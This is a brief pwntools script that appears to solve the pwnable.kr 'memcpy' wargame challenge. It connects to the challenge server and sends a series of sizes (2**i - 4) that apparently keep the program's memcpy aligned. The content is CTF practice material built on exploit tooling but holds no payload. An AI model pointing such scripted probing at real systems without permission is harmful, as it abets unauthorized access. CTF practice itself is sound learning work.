from pwn import *

context.log_level = 'DEBUG'

p = remote('pwnable.kr', '9022')
# p = process('./memcpy')

p.recvuntil(b':D')
for i in range(4, 14):
    p.sendlineafter(b' : ', str(2**i - 4).encode())

p.interactive()